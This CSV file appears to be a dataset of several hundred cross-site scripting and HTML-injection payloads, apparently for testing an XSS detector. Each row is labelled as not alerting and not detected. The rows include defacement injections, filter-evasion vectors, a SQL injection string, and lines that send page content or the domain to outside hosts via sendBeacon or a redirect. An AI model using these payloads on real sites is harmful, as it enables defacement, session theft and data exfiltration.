Payload,Alert,Detected
keyword=Coco+Nude+Pictures%20%3CIFRAME%20src=<br/>//haxkwd.info/1%3E,False,0
"<A HREF=""//www.google.com/""></A>",False,0
"<A HREF=""http://0102.0146.0007.00000223/""></A>",False,0
seccion=%22%3E%3Ciframe%20src=http://www.google.com%3E%3C/ifram<br/>e%3E%22%3E%3Ciframe%20src=http://www.google.com%3E%3C/iframe%3E%22%3E%3Ciframe%20src=http://www.goog<br/>le.com%3E%3C/iframe%3E,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=c<br/>om_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://x<br/>ssed.com,False,0
document['cookie'],False,0
q=%3Ch1%3E%3Cmarquee%3Eme+pica+el+pene%3C%2Fmarquee%3E<br/>%3C%2Fh1%3E&lang=es&nivel=&id_pag=&modulo=resultsearch,False,0
"<style>:target {transform: rotate(180deg);}</style><figcaption id=x style=""transition:transform 2s"" ontransitionrun=print()></figcaption>",False,0
q=XSSed&R=http://www.xssed.com/archive/,False,0
"session=';//\';//""//\""//--></SCRIPT>"">'><IFRAME<br/>SRC=http://xss.exofire.net/x/ WIDTH=1024 HEIGHT=860>",False,0
Search=1&dest=http://xss.skyr3x.us/?,False,0
cmd=logExternal&st.cmd=logExternal&st.name=translit_ru&st.link=http:/<br/>/www.xssed.org,False,0
ville=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/h1%3E<br/>%3C/marquee%3E,False,0
site=http://xssed.com,False,0
"<style>:target {color: red;}</style><source id=x style=""transition:color 10s"" ontransitioncancel=print()></source>",False,0
s=%22%3E%3Ch1%3E------------XSS+by+Celciuz.uni.cc+-------+%3C%2Fh1%3E&submit=<br/>Go,False,0
onwebkitanimationstart,False,0
?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e,False,0
"psearchtype=OR&TxtSrch=>"">%3Cimg%20src=""http://img73.imageshack.<br/>us/img73/5382/antifa20italiano20lz.jpg""%3E",False,0
agentid=kusomiso.com&red=http://kusomiso.com/,False,0
Content_ID=345458,False,0
Submit=Cerca&lr=si&query=%22%3E%3Cimg%20src=%22http://img152<br/>.imageshack.us/img152/7032/xssximagesd8.jpg%22%3E,False,0
"<style>:target {transform: rotate(180deg);}</style><spacer id=x style=""transition:transform 2s"" ontransitionrun=print()></spacer>",False,0
"<style>:target {color: red;}</style><tt id=x style=""transition:color 10s"" ontransitioncancel=print()></tt>",False,0
%22onauxclick=alert`AnonKryptiQuz`+a,False,0
words=%22%3E%3Cmarquee%3EDEFACED%20BY%20SPONSFULL%3C/marquee%3E,False,0
onerror=alert;throw 23;,False,0
tag=<iframe%20src=http://www.yahoo.com></iframe>,False,0
cont=search&lang=de,False,0
catalog=stickermaker&et=48e163e3&basket=b%3D<br/>5C3a42bfd100a6e848e15cdbc89e13b42bfd1357a994b9c4edd769d4588243596%26l%3D%26s%3D19xFp0IpoUylnEUcFpFtW<br/>2OZXDs-,False,0
<svg/onload​=alert/*1337*/(1)>,False,0
s=50&u=http://www.xssed.com,False,0
onChange,False,0
tbr=%3Ciframe%20src=%22http://2.bp.blogspo<br/>t.com/_CbDP4Hn8td0/TOG2MYZrm9I/AAAAAAAAADo/Fk6clItVhoM/s400/inj3ct0r.jpg%22%3E,False,0
"<a href=""j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;"">X</a>",False,0
"<;A HREF="";http://google.com/"";>;XSS<;/A>;",False,0
"<svg xmlns=""http://www.w3.org/2000/svg"">",False,0
p=%22%3E%3Ch1%3EXss+by+n0b0dy%3C%2Fh1%3E&s=0&Submit=buscar,False,0
"<img src=""livescript:document.vulnerable=true;"">",False,0
"searchString%3Autf8%3Austring=""><iframe src=index.htm",False,0
lid=dk&tid=modern_blue&f_user=&six=&f_email=<br/>=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/if<br/>rame%3E,False,0
idioma=es&pais=CL'%22%3E%3Ch1%3Etest,False,0
returnfunction=&searchstr=%27%22%3E%3Ch1%3ERubberDuck%3C%2F<br/>h1%3E%3Cbr%3E%3Cbr%3E%3Cmarquee%3EWhiteHat+Forever%3C%2Fmarque%3E,False,0
cat=%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
"<style>:target {transform: rotate(180deg);}</style><tbody id=x style=""transition:transform 2s"" ontransitionrun=print()></tbody>",False,0
nats=%22%3E%3Ciframe%20src=http://thehacking.org/%3E,False,0
"source=111-222-1933email@address.tst&f<br/>irstname=111-222-1933email@address.tst&lastname=111-222-1933email@address.tst&email=""+onmouseover=al<br/>ert(/HACKED-BY-TurKPoweR/)+",False,0
kwd=%3Ciframe%20src=http://google.com%3E%3C/iframe%3E,False,0
tool=hasher,False,0
#alert`AnonKryptiQuz`,False,0
*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */,False,0
"<iframe src=""vbscript:document.vulnerable=true;"">",False,0
uye=%22%3E%3Ch1%3E%20Swool%3Cmeta%20http-equiv=%22refresh%22%20co<br/>ntent=%221;URL=http://www.e-innercity.net/maxialem.htm%22%3E,False,0
option=login,False,0
"id=-1+UNION+SELECT+1,0x53514C20496E6A656374696F6E202B20585353656<br/>4206279203434343134452E3135,0x3A29,0x3A29,0x3A29,6,7,0x3C656D626564207372633D22687474703A2F2F7777772<br/>E796F75747562652E636F6D2F762F6F486735534A595248413026686C3D656E2666733D312672656C3D30266175746F706C6<br/>1793D312220747970653D226170706C69636174696F6E2F782D73686F636B776176652D666C617368222077696474683D223<br/>6343022206865696768743D2235303522202F3E,9,10,11,12,13,14,15,16,17,18",False,0
"&lt;IMG SRC=\""http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\""&gt;",False,0
"<style>:target {transform: rotate(180deg);}</style><img id=x style=""transition:transform 2s"" ontransitionrun=print()></img>",False,0
title=SeeMe!%20Nothing%27s%20important&url=%22%3E%3Ci<br/>frame%20src=%22http://1337day.com%22%3E,False,0
&fw_sig_width=624&fw_sig_premium_level=2&fw_sig=ca80e<br/>0337a4e3f00e117e954fe962fa7&fw_sig_time=1240159076609&fw_sig_owner=39798521&fw_sig_session_key=50387<br/>1026eaea129e12ad4c455fd5a924f2c8e784574ea5eb7184e89b1ee2694%2D39798521&fw_sig_permissions=none&fw_si<br/>g_api_key=ynwfbf8k2f7dn9jssqvcguxv&fw_sig_site=39798521&fw_sig_is_admin=0,False,0
&sel=%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
"""><h1><iframe width=""420"" height=""315"" src=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" allowfullscreen></iframe>123</h1>",False,0
onpointerenter,False,0
"<embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",False,0
op=katbak&id=%22%3E%3Ciframe%20src=http://hotturks.or<br/>g/%3E,False,0
"template=<img%20src=""http://turkstorm.org/tst/banner.jpg""%20w<br/>idth=1000%20height=400>",False,0
mots=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by<br/>+ironzorg%3C%2Fh1%3E%3C%2Fmarquee%3E&cat=0,False,0
term=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3Ecueba<br/>llr%3C%2Fstrong%3E%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
"data:text/html, type=image>",False,0
go=http://www.ar3sw0rmed.blogspot.com,False,0
onError,False,0
"<style>:target {transform: rotate(180deg);}</style><bdi id=x style=""transition:transform 2s"" ontransitionrun=print()></bdi>",False,0
"<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",False,0
Step=1,False,0
term=%27+%22+%3E%3Ciframe+src%3D%22http%3A%2F%2Fwww.craz<br/>ybucket.in%22%3E,False,0
<svg:svg>,False,0
page=createUser,False,0
"<x 1=""1""onxxx=1",False,0
id=882%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
display=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironz<br/>org%3C/h1%3E%3C/marquee%3E,False,0
"<input name=""password"" type=""password"" value=""secret"" />",False,0
"form_submit=forgot_email&mod_id=6&forgot_email='""><h1>XSS",False,0
"<svg onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",False,0
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//,False,0
"$(""script(2)"")",False,0
"<style>:target {color: red;}</style><footer id=x style=""transition:color 10s"" ontransitioncancel=print()></footer>",False,0
crack=%3Ch1%3EHacked%21%3Cp+align%3Dcenter%3E%3Cmarq<br/>uee%3E%3Cplaintext%3E,False,0
p=mod&mod=login,False,0
a=asextoyshop&s_cid=all&ser_key=%22%3E%3Cimg+src%3Dhttp%3A%2F<br/>%2Fkrassota.com%2Fi%2Fprikol%2F41.gif%3E%3C%2Fimg%3E%3C%22,False,0
%27%09);%0d%0a%09%09[1].find(alert)//,False,0
s=11680|0|884|15|wide|0&lg=de,False,0
url=www.geocities.com/pinke<br/>lephant2k7/owned.html,False,0
id=9&bt=o&st=web&fm=pro&ec=gb2312&kw=%22%3E%3Cmarquee%3EDe<br/>faced+BY+Sponsfull&imagefield.x=0&imagefield.y=0,False,0
sid=&id=10,False,0
words=%22%2F%3E%3Cmarquee%3E%3Ch1%3EXSSed+by+falling<br/>midget%3C%2Fh1%3E%3C%2Fmarquee%3E&submit=Search+UMD&config=custom%2Fumd&restrict=&exclude=&method=an<br/>d&format=long&sort=score,False,0
id=107969,False,0
"'';!--\""&lt;AnonKryptiQuz&gt;=&{()}",False,0
oninput,False,0
url=http%3A%2F%2Fservice1.symantec.co<br/>m%2Fsharedtech.nsf%2F0%2Fd59068009e7f27b965257287005fd39d%3FOpenDocument%26%27%3C/li%3E%3C/ul%3E%3C/<br/>td%3E%3C/tr%3E%3C/table%3E%3Cimg%20src=%22http://images.encyclopediadramatica.com/images/2/24/Norton<br/>_Godfather2.gif%22%3E%3C!--,False,0
"<iframe src=mhtml:http://html5sec.org/AnonKryptiQuz.gif!xss.html></iframe>//[""'`-->]]>]</div>",False,0
find=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fwww.sigsauer.com%3E%3C--,False,0
"<style>body{-moz-binding:url(""http://vulnerability-lab.com/crosssitescriptingmoz.xml#crosssitescripting"")}</style>",False,0
"[alert][0].call(this,1)",False,0
<form>,False,0
"<style>:target {transform: rotate(180deg);}</style><div id=x style=""transition:transform 2s"" ontransitionrun=print()></div>",False,0
<!--[if gte IE 4]>,False,0
"<style>:target {transform: rotate(180deg);}</style><img2 id=x style=""transition:transform 2s"" ontransitionrun=print()></img2>",False,0
selections=SL2&browsepage=Go&query=SL2&field=missionid&<br/>startat=0&maxresults=5%22%3E%3Ch1%3EC1c4Tr1Z%3C/h1%3E,False,0
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:document.vulnerable=true""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></span>",False,0
"radio_id=""><iframe></iframe>",False,0
s=%22%3E%3Ciframe%20src=%22http://xssed.com%22<br/>%3E,False,0
Section=Home&Template=/Security/Login.cfm,False,0
cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br/>[][][][][][][][][]=%3Cscript%20src=http://hiphopshare.xm.com/xss.js,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=com_con<br/>tent&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.c<br/>om/,False,0
clickTAG=http://googl<br/>e.com,False,0
"Ntk=All&Ntx=mode+matchallpartial&Ntt=""/><mar<br/>quee><h1>XSSed%20by%20fallingmidget</h1></marquee>",False,0
rid=file:%0AContent-Type:%20text/html;charset=UTF-7%0A%0A%2BADw-script%2BAD4-aler<br/>t(%27XSS%27);%2BADw-/script%2BAD4-,False,0
<svg/onload=location/**/='https://your.server/'+document.domain>,False,0
invocationType=recentSearchMaint&a=%22%3E%3C/div%3E%3Ch1%3E%3C<br/>a%20href=http://xssed.com%3EXSSED.COM%20-%20HTML%20INJECTION%20BY%20NULLFLOW%3C/a%3E%3C/h1%3E,False,0
mail=%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
"<style>:target {transform: rotate(180deg);}</style><textarea id=x style=""transition:transform 2s"" ontransitionrun=print()></textarea>",False,0
url=http://whk.sitehacking.net/,False,0
store_id=1,False,0
"ref=1""><iframe%20src=http://google.com>",False,0
"url=""><iframe src=http://google.com>",False,0
searWords=%22%3E%3Ciframe%20width=%22800%22%20height=%22600%22%20src<br/>=http://xssed.com%3E,False,0
<iframe src=http://vulnerability-lab.com/index.html <,False,0
nodelocation=000000000014&searchpage=1&pagepart=objectname;de<br/>scription;&freetext=%3Ciframe%20src=%22http://xssed.com%22%3E&searchbase=&dateformat=&searchrange=&g<br/>emeente=2963&page=zoek&doelgroep[particulier]=1&organisatie[gemeenten]=1&term=%3Ciframe%20src=%22htt<br/>p://xssed.com%22%3E&objecttype=,False,0
mode=profile&dil=&userid=126242,False,0
Data=DB&Adv='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarq<br/>uee%3EWhiteHat%20Forever%3C/marque%3E&Page='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarq<br/>uee%3EWhiteHat%20Forever%3C/marque%3E&Order='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmar<br/>quee%3EWhiteHat%20Forever%3C/marque%3E&txtSearch=,False,0
"Country=CHILE""><iframe<br/>src=http://xssed.com>",False,0
i='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarquee%3EWhiteHat<br/>%20Forever%3C/marque%3E,False,0
q=N%2eW%2eA&e=http%3a%2f%2fwww%2emininova%2eorg%2fsearch%2f%3f<br/>utorrent%26search%3d&u=1,False,0
header('Location: '.$_GET['param']);,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=c<br/>om_content&user_rating=1&submit_vote=x&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.com,False,0
searchtext=%3Ch1%3E%3Cmarquee%3Esl4xUz,False,0
"<style>:target {color: red;}</style><img id=x style=""transition:color 10s"" ontransitioncancel=print()></img>",False,0
"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=print()></label>",False,0
post,False,0
authorize_refer=http%3A%2F%2Fwww.vivastreet.fr%2Faccount_clas<br/>sifieds.php%3Fclassified_repost%3D3676244%26login_email%3D%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20<br/>ironzorg%3C/h1%3E%3C/marquee%3E%26utm_source%3DRepostNotify%26utm_medium%3Demail&reason=,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option<br/>=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http:/<br/>/xssed.com/,False,0
"This is a simple XSS vector that closes<TITLE>tags, which can encapsulate the malicious cross site scripting attack:",False,0
autostart=true&file=ht<br/>tp://bit.ly/H6ymdo,False,0
redirect=http://www.xssed.com,False,0
q=%22%3Ehttp://www.pasoindir.com/search.php?q=%22%3E%3Clink%20href=h<br/>ttp://starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3E,False,0
';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//,False,0
kod=<iframe src=http://www.fbi.gov>,False,0
"<;A HREF="";http://0x42.0x0000066.0x7.0x93/"";>;XSS<;/A>;",False,0
<STYLE>@import'http://.rocks/.css';</STYLE>,False,0
category=2&gubun=ENG?gubun=daily_news_item&idx=%22<br/>%3E%3Ciframe%20src=/%3E%3C/iframe%3E,False,0
q=http://usrportage.de,False,0
">""<iframe src=http://vulnerability-lab.com/>@gmail.com",False,0
labelphpmv=Recherche&t=tmp,False,0
ondblclick,False,0
q=aHR0cDovL3d3dy5nb29nbGUuY29tL2luZGV4LnBocD9hPSI%2BPHNjc<br/>mlwdD5hbGVydCgxMjMpPC9zY3JpcHQ%2B&hl=3ed,False,0
msg=%3Ch1%3E%3Cmarquee%3EXSS%20by%20Uber0n%3C/marquee%3E%3C/h1%3E,False,0
searchWord=%3Cmarquee%3E%3Cfont%20size=100%3EXSS+Found+by+vip<br/>erfx07%3C/font%3E%3C/marquee%3E,False,0
q=%22%3E%3Cmarquee%3Edefaced%20by%20sponsfull%3C/marquee%3E,False,0
OcomPartner=HlMrS91Yub!-1008566395!183185307!<br/>7001!-1&z=5cc2&r=1,False,0
&#x0003C,False,0
"<div id=""129""><svg>",False,0
onratechange,False,0
"<style>:target {transform: rotate(180deg);}</style><param id=x style=""transition:transform 2s"" ontransitionrun=print()></param>",False,0
frame=http://www.xssed.com/,False,0
"sid=0e9abb76a034e97fc64ff4bde00536a8&dir=""+onmouseover=a<br/>lert(1967297404)+",False,0
[1].find(alert),False,0
ruleID=572&itemID=0&itemType=CATEGORY&showChanges<br/>=true,False,0
onRedo,False,0
username=%271+or+1+%3D+--&error=%3Ch1%3Efucking%20xs<br/>sed%3Ch1%3E,False,0
dId=1&eId=10&actual_dId=79&sId=400fd00f2c6421f2a5f3a6df53568cd9,False,0
step=1&txt_srch=Happy+Birthday+To+Site%3Cimg%20src=%22http<br/>://i49.tinypic.com/dwpg5t.jpg%22%3E%3Cimg+src%3D%22http://i46.tinypic.com/5mxu0z.jpg%22%3E%3CIFRAME+<br/>SRC%3D%22http%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DnLUdeWKUSHY%22%3E%3C%2FIFRAME%3E,False,0
ssPageName=STRK:MESELX:IT&_trksid=p3984.m1555.l2649,False,0
searchValue=%22%3E%3Cfont%20size=%229%22%3EDefaced%20for<br/>%20Xssed.com%3C/font%3E%3C/form%3E%3C/div%3E%3C%21--%3C%21--,False,0
FuseAction=Search.Results&Keywords=%27%22%3E%3Cmarquee%3E%3Ch1%3EXSS<br/>+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E<br/>&x=9&y=6,False,0
nav=Login,False,0
q=__22__3E__3Ciframe-src__3D__22http__3A__2F__2Fxssed.com__2<br/>2__3E&cy=au,False,0
"<x style=""behavior:url(%(sct)s)"">",False,0
"checkAll=1&searchfield=""\>hadopi<iframe<br/>src=""http://hackadaycom.files.wordpress.com/2009/07/wtf-button.jpg""",False,0
U=xssed.com,False,0
onscroll,False,0
searchString=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+www.r3t.n<br/>3t.nl%3C%2Fh1%3E%3C%2Fmarquee%3E&page=espn,False,0
cerca=%3E%3Ciframe%20src=http://xssed.com%3E&pag=1,False,0
"<STYLE>BODY{-moz-binding:url(""http://.rocks/moz.xml#"")}</STYLE>",False,0
bannerID=90&zoneid=1&s&zoneid=41&source=&dest=http://sey<br/>men.org,False,0
q=%3Cmarquee%3E%3Ch1%3Ecueballr%3C%2Fh1%3E%3C%2Fm<br/>arquee%3E&x=15&y=12,False,0
"orig=""><h1><BR>XSS%20FLAW</h1><comment>",False,0
SearchText=<iframe+src=http://www.google.com></iframe>,False,0
<body onbeforeprint=console.log(1)>,False,0
accesibilidad=3&canal=CAccionistas&cid=1147087106975&empr=SA<br/>NCorporativo&pagename=SANCorporativo/Page/SC_ContenedorBuscadorGeneral&pagina=1,False,0
func=frontend.show&template=searchresult&keyw<br/>ord=%3Cfont%20color=red%20size=72%3E%3Cmarquee%3EXSSED%3C/font%3E&submit.x=0&submit.y=0,False,0
search_text=%22%3E%20%3Ciframe%20src=%22http://www.google.com/%22%3E,False,0
exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);,False,0
alang=fr&search=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20i<br/>ronzorg%3C/h1%3E%3C/marquee%3E,False,0
id_menu=busca&slc_especie=&numero_lei=&slc_licitacao=&s<br/>lc_lazer=&dt_inicial=&dt_final=&slc_concursos=&slc_conta_publica=&palavra_chave=%22%3E%27%3E%3CSCRIP<br/>T+SRC%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E,False,0
onmousedown,False,0
search<br/>Text=%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
"&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;AnonKryptiQuz&lt;/xss&#58;xss&gt;&lt;/HTML&gt;",False,0
"<brute+onbeforescriptexecute=a=alert,a(1%26%23x29>",False,0
&#X003C;,False,0
lang=%22%3E%3Ch1%3Exss%20by%20n0b0dy%3C/h1%3E&page=editor:771,False,0
onBeforeUnload,False,0
"query=""><iframe src=http://www.google.com>",False,0
&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;,False,0
"val=svara&id=5&kategori=15&l=""></form></tr><meta<br/>http-equiv=refresh content=1;url=http://www.xssed.com/>&stad_namn=vetlanda",False,0
go=http://xssed.com/,False,0
mes=6%22%3E%3Ch1%3EC1c4Tr1Z%3C/h1%3E,False,0
op=search&query=query.value,False,0
&#X03c,False,0
"<;STYLE>;BODY{-moz-binding:url("";http://ha.ckers.org/xssmoz.xml#xss"";)}<;/STYLE>;",False,0
"<style>:target {transform: rotate(180deg);}</style><br id=x style=""transition:transform 2s"" ontransitionrun=print()></br>",False,0
"&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;",False,0
core=listar&tt=Busca,False,0
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,False,0
"<XSS STYLE=""behavior: url(%(htc)s);"">",False,0
"<style>:target {color: red;}</style><tr id=x style=""transition:color 10s"" ontransitioncancel=print()></tr>",False,0
"<div id=""121""><html xmlns=""http://www.w3.org/1999/xhtml""",False,0
username=%22%20style=-moz-binding:url(http://zucker.schokokeks.org/~la<br/>rs/xss/username.xml%23username)%20test=%22,False,0
redir=http:%2F%2Fr3t.n3t.nl,False,0
"?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",False,0
term=%27+%22%3E%3Ciframe+src%3D%22http%3A//www.crazybucket.<br/>in%22%3E,False,0
narrowdesc=Accounting&narr<br/>owcode=FA01&metrocode=&zipcode=%22%3E%3Ch1%3ENY-Shit!%20by%20C1c4Tr1Z%3C/h1%3E&x=14&y=11,False,0
sinif=<h1>xssed%20by%20madking%20biyosecurity</h1>,False,0
msg=%3Cimg%20SRC=http://my.telegraph.co.uk/VirtualContent<br/>/86950/20070806152444.jpg%3E,False,0
sign=leo&gender=male&web<br/>_id=MSCD9&PHPSESSID=c0kblnrggarrm600iajobdk5k4&__utma=29747235.2522239386150398500.1242260207.124226<br/>0207.1242260207.1&__utmb=29747235.13.10.1242260207&__utmc=29747235&__utmz=29747235.1242260207.1.1.ut<br/>mcsr%3D(direct)|utmccn%3D(direct)|utmcmd%3D(none)&nip=50829&guy_x=289&guy_y=221&you=&name=%22%3E%3Cs<br/>cript%20src=http://www.fileden.com/files/2008/1/10/1691310/xss.gif%3E&image.x=90&image.y=79,False,0
<marquee onstart=\u0070r\u06f\u006dpt()>,False,0
option=com_content&task=view&id=179&Itemid=57,False,0
"55302985,39065826,http://xssed.com",False,0
id=%22%27%3E%3Ch1%3E%3Cmarquee%3Ecueballr%3C%2Fmarquee%3E%3C%2Fh<br/>1%3E&opt=tag&commit=Search,False,0
url=%22%3E%3Cmarquee%3E%3Ch1%3Exssed%3C/h1%3E%3C/marquee%3E,False,0
RequestTimeout=50000000,False,0
"&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;",False,0
who=%3Ciframe%20src=http://google.com%3E,False,0
%3C,False,0
page=http://www.xssed.com,False,0
"<style>:target {transform: rotate(180deg);}</style><audio2 id=x style=""transition:transform 2s"" ontransitionrun=print()></audio2>",False,0
bannerid=211&zoneid=1&s&zoneid=41&source=&dest=http://sey<br/>men.org,False,0
bannerid=15&zoneid=4&source=&dest=http%3A%2F%2Fr3t.n3t.nl,False,0
page=<marquee>%3Ch1%3EHotpockets%20Wubs%20XSS%20^_^%3C/h1%3E</mar<br/>quee>,False,0
onpageshow,False,0
<x%0Conxxx=1,False,0
<!ATTLIST xsl:stylesheet id    ID    #REQUIRED>]>,False,0
top[‘al\145rt’](1),False,0
aain=1&ItemId=1&OrderId=0&TransId=0&url=http://xssed.com,False,0
"q=<iframe src=""http://xssed.com"">&submit.x=5&submit.y=15",False,0
"query_string='""><iframe src=http://xssed.com>",False,0
"q=vlc&q=%3Cmarquee%3Exss%20by%20s-dz<iframe<br/>src=""http://xssed.com"">",False,0
category=search01,False,0
<embed code=%(scriptlet)s></embed>,False,0
lang='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarquee%3EWhit<br/>eHat%20Forever%3C/marquee%3E,False,0
page=search&nume=%3Cbr%3E%3Ccenter%3E%3Ch1%3ESsAgEnT+%7C+Secur<br/>ityShieldTeam%3Ch1%3E%3Cbr%3E%3Ch2%3EJust+for+fun%3C%2Fh2%3E%3Ciframe+src%3Dhttp%3A%2F%2Fen.wikipedi<br/>a.org%2Fwiki%2FXSS+width%3D700%3E%3C%2Fiframe%3E%3C%2Fcenter%3E&searchSubmit=Cauta,False,0
<!--*/!'*/!>%0D<svg/onload=confirm'1'//,False,0
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;,False,0
email=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/h<br/>1%3E%3C/marquee%3E&pass=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/h1%3E%3C/marquee%3E,False,0
"<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontransitioncancel=print()></th>",False,0
m=http://xssed.com,False,0
url=http://r14nulr00t.blogspot.com,False,0
</head>,False,0
id=75&y=<center><h1>Tux injection<img<br/>src=http://tbn0.google.com/images?q=tbn:JtOEe3Cb2woKOM:http://www.lezactus.com/images/6865_tux_resiz<br/>e.jpg >,False,0
